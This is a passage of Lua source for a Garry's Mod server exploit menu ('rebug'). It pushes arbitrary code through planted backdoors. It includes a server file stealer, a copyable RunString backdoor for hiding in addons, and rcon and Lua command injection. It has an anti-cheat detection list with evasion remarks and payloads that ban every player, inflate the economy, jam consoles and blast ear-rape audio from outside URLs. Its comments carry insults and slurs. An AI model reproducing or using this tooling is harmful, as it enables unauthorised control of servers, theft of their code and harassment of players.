                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://tewtewqwef.000webhostapp.com/nononses.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("Penis (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://rvac.cc/log1n/sound/penis.mp3" .. "\" , \"mono\", function() end)]])")
			end)

            rebug.AddButtonBIG("Pornhub Intro (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://rvac.cc/log1n/sound/pornhub.mp3" .. "\" , \"mono\", function() end)]])")
			end)

            rebug.AddButtonBIG("RamRanch (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://tewtewqwef.000webhostapp.com/RamRanch.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("SovietNationalAnthem (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://tewtewqwef.000webhostapp.com/SovietNationalAnthem.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("Static (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://rvac.cc/log1n/sound/static.mp3" .. "\" , \"mono\", function() end)]])")
			end)

            rebug.AddButtonBIG("White Noise (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://tewtewqwef.000webhostapp.com/whitenoise.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("Bot (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://httpsinfamousvoice1com.000webhostapp.com/Bot.mp3" .. "\" , \"mono\", function() end)]])")
            end)
        end

--[[-------------------------------------------------------------------------------------
File Stealer ( BD Required )
----------------------------------------------------------------------------------------]]
        function filegrab()
            local filestealer = vgui.Create("DFrame")
            surface.PlaySound("buttons/blip1.wav")
            filestealer:SetSize(600, 150)
            filestealer:Center()
            filestealer:SetTitle("File Downloader ( Backdoor Required )")
            filestealer:MakePopup()
            filestealer:SetDraggable(true)

            filestealer.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(35, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(35, 35, 35, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local filePlate = vgui.Create('DPanelList', filestealer)
            filePlate:SetSize(590, 120)
            filePlate:SetPos(6, 27)

            filePlate.Paint = function(s, w, h)
                surface.SetDrawColor(Color(35, 35, 35))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(35, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(35, 35, 35, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local List8 = vgui.Create("DPanelList", filePlate)
            List8:SetPos(20, 13)
            List8:SetSize(550, 90)
            List8:SetName("")

            List8.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(21, 21, 21, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local item8 = vgui.Create("DPanelList", List8)
            item8:SetPos(10, 8)
            item8:SetSize(530, 75)
            item8:SetPadding(2)
            item8:SetSpacing(2)
            item8:EnableHorizontal(false)
            item8:EnableVerticalScrollbar(true)
            item8:SetName("")

            item8.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetDrawColor(35, 35, 35, 0)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            function noob.OpenTextDocument(path, str, parent)
                local downloader = vgui.Create("DButton", item8)
                downloader:SetFont("Trebuchet18")
                downloader:SetText("File Downloader (Save)")
                downloader:SetTextColor(Color(255, 255, 255, 255))
                downloader:SetPos(2, 39)
                downloader:SetSize(525, 30)

                downloader.Paint = function(self, w, h)
                    surface.SetDrawColor(Color(30, 30, 30))
                    surface.DrawRect(0, 0, w, h)
                    surface.SetDrawColor(21, 21, 21)
                    surface.SetMaterial(upgrad)
                    surface.SetDrawColor(o_color2)
                    surface.SetMaterial(downgrad)
                    surface.SetDrawColor(o_color2)
                    surface.SetDrawColor(21, 21, 21, 255)
                    surface.DrawOutlinedRect(0, 0, w, h)
                end

                downloader.DoClick = function()
                    surface.PlaySound("buttons/button18.wav")

                    Derma_StringRequest("Save file " .. path .. "", "File name e.g: server.txt)", "", function(text)
                        if not string.find(text, ".txt") then
                            text = text .. ".txt"
                        end

                        if not file.IsDir("rebug/files/", "DATA") then
                            file.CreateDir("rebug/files/")
                        end

                        file.Write("rebug/files/" .. text, str)
                        noob.Notify("Saved source to data/rebug/files/" .. text)
                    end)
                end
            end

            rebug.AddButtonBIG("File Downloader", item8, function()
                surface.PlaySound("buttons/button18.wav")

                Derma_StringRequest("Steal File Source", "File Path (Relative to garrysmod/)", "", function(text)
                    net.Receive("file", function(len)
                        local str = net.ReadString()

                        if str ~= "ERROR" then
                            noob.OpenTextDocument(text, str, frame)
                        else
                            noob.Notify("Unable to find file " .. text .. " on the server")
                        end
                    end)

                    noob.PostLua([[
					util.AddNetworkString( "file" )
					local id = ]] .. LocalPlayer():UserID() .. [[
					local f = file.Open( "]] .. text .. [[", "r", "GAME" )
					if !f then 
					net.Start( "file" )
					net.WriteString( "ERROR" )
					net.Send( Player( id ) )
					return 
					end
					local str = f:Read( f:Size() )
					f:Close()
					net.Start( "file" )
					net.WriteString( str )
					net.Send( Player( id ) )
				]])
                end)
            end)
        end

        local filegrabber = vgui.Create("DButton", VoidPlate)
        filegrabber:SetFont("Trebuchet18")
        filegrabber:SetText("File Download")
        filegrabber:SetTextColor(Color(255, 255, 255, 255))
        filegrabber:SetPos(235, 591)
        filegrabber:SetSize(180, 40)

        filegrabber.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        filegrabber.DoClick = function()
            filegrab()
            Void:SetVisible(false)
        end

--[[-------------------------------------------------------------------------------------
AntiCheat Detection
----------------------------------------------------------------------------------------]]
            local acfags = {
                ["BetterSNTE Anti-Exploit"] = {
                    desc = "This was created shortly after SNTE became noticed to the pubic, This addon makes snte even \n more useful but luckly for you are detour works on this addon (Don't scan backdoors)",
                    scan = function()
                        if file.Exists("epstat.lua", "LUA") or file.Exists("autorun/!!bettersnte.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Cake Anti-Cheat (CAC)"] = {
                    desc = "One of the best anticheats ever created on gmod still bans kids for cheating after it \n was removed from gmodstore in 2017. Pity it it was never made to detect backdoors.",
                    scan = function()
                        if _G.CAC then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Quack Anti-Cheat (QAC)"] = {
                    desc = "This addon is a joke even when it was released in 2014 it didn't detect anything. \n Still to this day i question if it was actually meant to ban people.",
                    scan = function()
                        if _G.QAC then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Simplac Anti-Cheat (SAC)"] = {
                    desc = "This anticheat became popular for less than a week then get detoured shortly after not only that this anticheat had an exploit to crash servers \n what a mess for simplac lol.",
                    scan = function()
                        if _G.simplicity then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Cardinal Anti-Cheat"] = {
                    desc = "This anticheat works like a screengrab and it's detections won't detect anything including something like kone bypass or some other shit 2014 dll bypass. I also \n like how this was made somewhere around 2018 but surely you can make something better than that.",
                    scan = function()
                        if file.Exists("sh_cardinal.lua","LUA") or file.Exists("client/cl_cardinal.lua","LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["CIB Anti-Exploit"] = {
                    desc = "This anticheat mainly bans people for putting certain words in console such as 'smeghack' or some old menu that has been out \n for ages however i don't think they have insert key in there keywords.",
                    scan = function()
                        if file.Exists("cib/sh_config_cib.lua","LUA") or file.Exists("autorun/sh_start_cib.lua","LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Nyaaa Anti-Exploit"] = {
                    desc = "From my understanding this addon was created to prevent people from backdooring and i can tell that this isn't popular and never will be \n i am fairly certain that this addon doesn't even detect anything.",
                    scan = function()
                        if file.Exists("autorun/ab.lua","LUA") or file.Exists("autorun/client/ab.lua","LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
				["Jenni Anti-Exploit"] = {
                    desc = "This is a worse version of SNTE, It would make 1 net string appear to those cheaters that have it in their list except rebug doesn't have 'anti_exploits_ban' \n in its list so no ban for you :)",
                    scan = function()
                        if file.Exists("autorun/client/cl_anti_exploits.lua","LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
				["Telecomm Anti-Exploit"] = {
                    desc = "This is a copy of the addon 'betterSnte' it uses the same functionality as that addon, To me \n i find this pointless to use on a gmod server let alone rename the addon.(Don't scan backdoors)",
                    scan = function()
                        if file.Exists("autorun/client/cl_antinexploits.lua","LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["SNTE Anti-Exploit"] = {
                    desc = "This has been ruining skids for more than a year now. With our methods you can detour \n this idiotic anti-cheat and not have a problem with it.",
                    scan = function()
                        if ConVarExists("snte_ulxluarun") or file.Exists("autorun/!!bettersnte.lua", "LUA") or file.Exists("autorun/!coresource_snte.lua", "LUA") or istable(global_nets) then -- if BetterSNTE then makes present
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Modern Anti-Cheat"] = {
                    desc = "This addon took ideas from snte and has a dhtml detection methods such as modules, \n Luckly for you WE are undetected from this shit.",
                    scan = function()
                        if file.Exists("autorun/client/!!!!!!!!!!!!!!!!!!!!!!aaaaaaaaaaa.lua", "LUA") or file.Exists("autorun/client/cl_mac.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Swift Anti-Cheat"] = {
                    desc = "This is the worst anticheat that i have ever seen i used kone bypass and it didn't ban me \n let alone use a backdoor what a joke of an addon.",
                    scan = function()
                        if file.Exists("swiftac.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Umbrella Anti-Exploit"] = {
                    desc = "This was created by a bunch of retarded russians, you would have thought that they would have a brain for cheating \n in games but for gmod however they make something that is a copy of snte.",
                    scan = function()
                        if file.Exists("umbrella.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Viper Anti-Exploit"] = {
                    desc = "This is shit anticheat was uploaded to a leaking website by some russian, this addon is complete shit doesn't even detect anything \n don't bother get scared of this shit if you somehow find it on a server.",
                    scan = function()
                        if file.Exists("cl_viperbdcheck.lua", "LUA") or file.Exists("sh_viperbdcheck.lua", "LUA") or file.Exists("autorun/cl_viper.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Raptor Anti-Exploit"] = {
                    desc = "This is a russian anticheat that is completly useless. It doesn't have anything inside that code that even detect kone bypass.\n Do not be feared by this addon.",
                    scan = function()
                        if file.Exists("autorun/client/cl_rac.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["C0nw0nk Anti-Cheat"] = {
                    desc = "This isn't a popular anticheat it has low detection methods the only thing that can catch you is the bhop \n but ill be suprised if that actually works.",
                    scan = function() 
                        if file.Exists("autorun/send-lua-and-net-send.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Prop Protection (SPC)"] = {
                    desc = "GmodStore paid addon, This will prevent you from prop killing an`d prop climbing. \n This will irritate you if you were planing on prop killing",
                    scan = function()
                        if file.Exists("autorun/smartsauce_loader.lua", "LUA") or file.Exists("autorun/smartsauce/sv_main.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Spawn Protection (SZ)"] = {
                    desc = "GmodStore paid spawn protection an addon that has been around for some time and is still \n a popular addon to lots of people including me",
                    scan = function()
                        if file.Exists("sz_config.lua", "LUA") or file.Exists("autorun/autorun_safezones.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["Screengrab Anti-Cheat"] = {
                    desc = "This is an addon that has been catching skids out for a while, most wonder how admins see \n there shitty wall hacks except rebug doesn't have any",
                    scan = function()
                        if file.Exists("cl_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab_v2.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["BLogs Logging System"] = {
                    desc = "One of the best logging systems added to gmod since release, it has lots of logging features including \n live feed which has been useful for lots of servers( Be careful )",
                    scan = function()
                        if file.Exists("gmodadminsuite/modules/logging/cl_menu.lua", "LUA") or file.Exists("vgui/gas_logging_advanced_search_item.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["MLogs Logging System"] = {
                    desc = "Quite a decent logging system i have been told, This addon logs lots of things im not sure \n that it logs the same or more than blogs",
                    scan = function()
                        if file.Exists("mlib/lua/autorun/mlib.lua", "LUA") or file.Exists("mlogs2/lua/mlogs/config/cl_config", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["PLogs Logging System"] = {
                    desc = "Used to be a paid gmodstore addon BUT now is on github for lack of updates, This was a shit addon anyways \n doesn't surprise me that its on github now lol.",
                    scan = function()
                        if file.Exists("plogs_cfg.lua", "LUA") or file.Exists("plogs_mysql_cfg.lua", "LUA") or file.Exists("autorun/plogs_init.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
                ["LUA Stealer (Void)"] = {
                    desc = "This is one of my creation, It is able to download the source code to your lua scripts from \n you just pressing a button. This is a good addon yesss :)",
                    scan = function()
                        if file.Exists("autorun/sh_fuckthissheet.lua", "LUA") then
                            return true
                        else
                            return false
                        end
                    end
                },
            }

        function anticheats()
            local acpanel = vgui.Create("DFrame")
            if not acpanel then return end
            acpanel:SetSize(500, 455)
            acpanel:SetTitle("Security measures for the server")
            acpanel:Center()
            acpanel:MakePopup()

            acpanel.Paint = function(s, w, h)
                surface.SetDrawColor(Color(30, 30, 30, 255))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(Color(55, 55, 55, 255))
                surface.DrawOutlinedRect(0, 0, w, h)
                surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
                surface.SetDrawColor(Color(33, 33, 33, 200))
                surface.DrawRect(10, 25, w - 20, h - 35)
            end

            local Plist = vgui.Create("DPanelList", acpanel)
            Plist:SetSize(acpanel:GetWide() - 20, acpanel:GetTall() - 35)
            Plist:SetPadding(5)
            Plist:SetSpacing(5)
            Plist:EnableHorizontal(false)
            Plist:EnableVerticalScrollbar(true)
            Plist:SetPos(10, 25)
            Plist:SetName("")

            local function CreateACPanel(cmd)
                if not acpanel then return end
                local cmdp = vgui.Create("DPanel")
                cmdp:SetSize(Plist:GetWide(), 60)
                cmdp.Cmd = cmd
                cmdp.Desc = acfags[cmd].desc

                cmdp.Paint = function(s, w, h)
                    surface.SetDrawColor(Color(50, 50, 50, 255))
                    surface.DrawRect(0, 0, w, h)
                    surface.SetDrawColor(Color(65, 65, 65, 255))
                    surface.DrawOutlinedRect(0, 0, w, h)
                    surface.DrawLine(0, 24, w, 24)
                    draw.DrawText(cmdp.Cmd, "DermaDefault", 10, 5, Color(255, 255, 255))
                    draw.DrawText(cmdp.Desc, "DermaDefault", 10, 28, Color(205, 205, 255, 100))
                end

                Plist:AddItem(cmdp)
            end

            for k, v in pairs(acfags) do
                if v["scan"]() then
                    CreateACPanel(k)
                end
            end
        end

        local anticheat = vgui.Create("DButton", VoidPlate)
        anticheat:SetFont("Trebuchet18")
        anticheat:SetText("AntiCheats")
        anticheat:SetTextColor(Color(255, 255, 255, 255))
        anticheat:SetPos(473, 591)
        anticheat:SetSize(180, 40)

        anticheat.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        anticheat.DoClick = function()
		surface.PlaySound("buttons/button18.wav")
            anticheats()
            Void:SetVisible(false)
        end

--[[-------------------------------------------------------------------------------------
Panels 1 : rcon / detour
----------------------------------------------------------------------------------------]]
        local List1 = vgui.Create("DPanelList", VoidPlate)
        List1:SetPos(6, 9)
        List1:SetSize(876, 117)
        List1:SetPadding(5)
        List1:SetSpacing(5)
        List1:EnableHorizontal(false)
        List1:EnableVerticalScrollbar(true)
        List1:SetName("")

        List1.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local detour = vgui.Create("DTextEntry", List1)
        detour:SetPos(467, 9)
        detour:SetSize(400, 100)
        detour:SetTextColor(Color(255, 255, 255, 255))
        detour:SetFont("Trebuchet18")

        detour.Paint = function(self, w, h)
            surface.SetDrawColor(Color(33, 33, 33))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
            self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
        end

        detour.OnEnter = function(self)
            surface.PlaySound("buttons/button18.wav")
            noob.Notify("Targeting NetString: '" .. detour:GetValue() .. "'")
            channel = self:GetValue()
        end

        local shitbox = vgui.Create("DTextEntry", List1)
        shitbox:SetPos(10, 9)
        shitbox:SetSize(416, 64)
        shitbox:SetTextColor(Color(255, 255, 255, 255))
        shitbox:SetFont("Trebuchet18")
        shitbox:SetMultiline(true)

        shitbox.Paint = function(self, w, h)
            surface.SetDrawColor(Color(33, 33, 33))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
            self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
        end

        local rconcmd = vgui.Create("DButton", List1)
        rconcmd:SetFont("Trebuchet18")
        rconcmd:SetText("Rcon CMD")
        rconcmd:SetTextColor(Color(255, 255, 255, 255))
        rconcmd:SetPos(10, 79)
        rconcmd:SetSize(200, 30)

        rconcmd.Paint = function(self, w, h)
            surface.SetDrawColor(Color(200, 24, 24))
            surface.SetDrawColor(40, 40, 40)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        rconcmd.DoClick = function()
            surface.PlaySound("buttons/button18.wav")
            local GetEntry = shitbox:GetValue()
            net.Start(channel)
            net.WriteString(GetEntry)
            net.WriteBit(false)
            net.SendToServer()
        end

        local luacmd = vgui.Create("DButton", List1)
        luacmd:SetFont("Trebuchet18")
        luacmd:SetText("Lua CMD")
        luacmd:SetTextColor(Color(255, 255, 255, 255))
        luacmd:SetPos(226, 79)
        luacmd:SetSize(200, 30)

        luacmd.Paint = function(self, w, h)
            surface.SetDrawColor(Color(200, 24, 24))
            surface.SetDrawColor(40, 40, 40)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        luacmd.DoClick = function()
            local GetEntry = shitbox:GetValue()
            net.Start(channel)
            net.WriteString(GetEntry)
            net.WriteBit(1)
            net.SendToServer()
        end

--[[-------------------------------------------------------------------------------------
Panels 2 : backdoors :)
----------------------------------------------------------------------------------------]]
        local List2 = vgui.Create("DPanelList", VoidPlate)
        List2:SetPos(19, 155)
        List2:SetSize(180, 430)
        List2:SetPadding(2)
        List2:SetSpacing(2)
        List2:EnableHorizontal(false)
        List2:EnableVerticalScrollbar(true)
        List2:SetName("")

        List2.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local item1 = vgui.Create("DPanelList", List2)
        item1:SetPos(12, 8)
        item1:SetSize(170, 420)
        item1:SetPadding(2)
        item1:SetSpacing(2)
        item1:EnableHorizontal(false)
        item1:EnableVerticalScrollbar(true)
        item1:SetName("")

        item1.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetDrawColor(35, 35, 35, 0)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local Bar1 = vgui.Create("DScrollPanel", item1)
        Bar1:Dock(FILL)
        local sBar1 = Bar1:GetVBar()
        function sBar1:Paint()
        end
        function sBar1.btnUp:Paint()
        end
        function sBar1.btnDown:Paint()
        end
        function sBar1.btnGrip:Paint()
        end

        local copy = vgui.Create("DButton", VoidPlate)
        copy:SetFont("Trebuchet18")
        copy:SetText("Copy Backdoor")
        copy:SetTextColor(Color(255, 255, 255, 255))
        copy:SetPos(19, 591)
        copy:SetSize(180, 40)

        copy.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        copy.DoClick = function()
            surface.PlaySound("buttons/button18.wav")
            rprint(" Copied! LuaRun or place inside addon")
            SetClipboardText('util.AddNetworkString("\x52\x45\x42\x55\x47")net.Receive("\x52\x45\x42\x55\x47"),function()RunString(net.ReadString())end)')
        end

        local bhop = vgui.Create("DButton", VoidPlate)
        bhop:SetFont("Trebuchet18")
        bhop:SetText("Bunny Hop")
        bhop:SetTextColor(Color(255, 255, 255, 255))
        bhop:SetPos(19, 637)
        bhop:SetSize(180, 40)

        bhop.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        bhop.DoClick = function()
            surface.PlaySound("buttons/button18.wav")

            if hook.GetTable()["VOIDZZ"] then
                hook.Remove("VOIDZZ")
            end

            local function ch_bunnyhop(ply)
                if (ply:KeyDown(IN_JUMP) and not LocalPlayer():IsOnGround()) then
                    ply:RemoveKey(IN_JUMP)

                    if not LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() ~= MOVETYPE_NOCLIP then
                        if (ply:GetMouseX() > 1 or ply:GetMouseX() < -1) then
                            ply:SetSideMove(ply:GetMouseX() > 1 and 400 or -400)
                        else
                            ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D())
                            ply:SetSideMove((ply:CommandNumber() % 2 == 0) and -400 or 400)
                        end
                    end
                elseif (ply:KeyDown(IN_JUMP)) then
                    ply:SetForwardMove(10000)
                end
            end

            hook.Add("CreateMove", "VOIDZZ", function(ply)
                ch_bunnyhop(ply)
            end)
        end

        -- Backdoor 1
        rebug.AddButton("@Inject SendLua Interface", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[util.AddNetworkString ('REBUG') net.Receive ('REBUG', function (length, ply) local netString = net.ReadString () local bit = net.ReadBit () if bit == 1 then RunString (netString) else game.ConsoleCommand (netString ..'\n') end end)]])
        end)

        rebug.AddButton("Artillery Server Strike", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[if !bombstrike then
				hook.Add("Think", "lulz_bombstrike", function()
				local explode = ents.Create("env_explosion")
				local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))
				local trc = {}
				trc.start = ps
				trc.endpos = ps + Vector(0, 0, -99999)
				local tr = util.TraceLine(trc)
				if !tr.Hit then return end
				explode:SetPos(tr.HitPos)
				explode:Spawn()
				explode:SetKeyValue("iMagnitude", "400")
				explode:Fire("Explode", 0, 0)
				end)
				bombstrike = true
				else
				hook.Remove("Think", "lulz_bombstrike")
				bombstrike = false
				end]])
        end)

        rebug.AddButton("Announce centre screen", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Set Custom Text", "Set Text", "", function(str)
                noob.PostLua("for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, \"" .. str .. "\") end")
            end)
        end)

        rebug.AddButton("AWarns2 user block", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
				noob.PostLua([[AWarn.groupBlacklist = {"user",}]])
				rprint('Blocked awarns from warning users')
		end)

        rebug.AddButton("Broken Glass Symphony", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[if !timer.Exists("A true masterpiece") then
				timer.Create("A true masterpiece", 0.2, 0, function()
				for _, p in pairs(player.GetAll()) do
				p:EmitSound("physics/glass/glass_largesheet_break"..math.random(1,3)..".wav", 100, math.random(40, 180))
				end
				end)
				else
				timer.Remove("A true masterpiece")
				end]])
        end)

        rebug.AddButton("Double Or Nothing", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Set win chance", "1-100", "", function(str)
                noob.PostLua("BDON_CONFIG.doubleChance = " .. str)
            end)
        end)


        rebug.AddButton("Ban All Players", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Ban All Players", "Reason", "", function(text)
                noob.PostLua([[local id = ]] .. LocalPlayer():UserID() .. [[
					for k, v in next, player.GetAll() do
					if v:UserID() == id then continue end
					v:Ban( 0, false )
					v:Kick( "]] .. tostring(text) .. [[" )
					end]])
            end)
        end)

        rebug.AddButton("Break Economy", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[for k,v in pairs(player.GetAll()) do v:addMoney(9999999999) end]])
        end)

        rebug.AddButton("Custom Job", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
			noob.PostLua([[
			TEAM_]]..noobstr..[[ = DarkRP.createJob("Project Rebug", {
				model = "models/player/skeleton.mdl",
				weapons = {"weapon_stunstick", "unarrest_stick", "m9k_glock", "m9k_dbarrel", "m9k_usas", "m9k_barret_m82", "m9k_svu", "m9k_acr", "m9k_vector", "m9k_m202", "m9k_milkormgl", "lockpick", "pro_lockpick", "staff_lockpick"},
				command = "]]..noobstr..[[",
				description = "A fucking gamer",
				max = 1,
				customCheck = function(ply) return ply:SteamID() == "]]..ply:SteamID()..[[" end,
				CustomCheckFailMsg = "This isn't your custom class!",
				color = Color(0, 0, 0, 255),
				salary = 1000000000,
				admin = 0,
				vote = false,
				hasLicense = true,
				category = "Citizens",
				PlayerSpawn = function(ply)
					ply:SetMaxHealth(10000)
					ply:SetHealth(10000)
					ply:SetArmor(10000)
				end,
				})
			]]) rprint('Job Command: /'..noobstr)
		end)

        rebug.AddButton("Cleanup Map", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[game.CleanUpMap()]])
        end)

        rebug.AddButton("Console Jammer", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[if !(timer.Exists("consoleJammer")) then
				timer.Create("consoleJammer", 0.5, 0, function()
				print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
				end)
				else
				timer.Destroy("consoleJammer")
				end]])
        end)

        rebug.AddButton("Change Everyone Name", Bar1, function()
            Derma_StringRequest("Set Everyones Name", "Name", "", function(text)
                noob.PostLua([[local str = "]] .. text .. [["
					for k, v in next, player.GetAll() do
					DarkRP.storeRPName( v, str )
					v:setDarkRPVar( "rpname", str )
					end]])
            end)
        end)

        rebug.AddButton("Change All Model", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Change Everyones Model", "Model Directory", "", function(str)
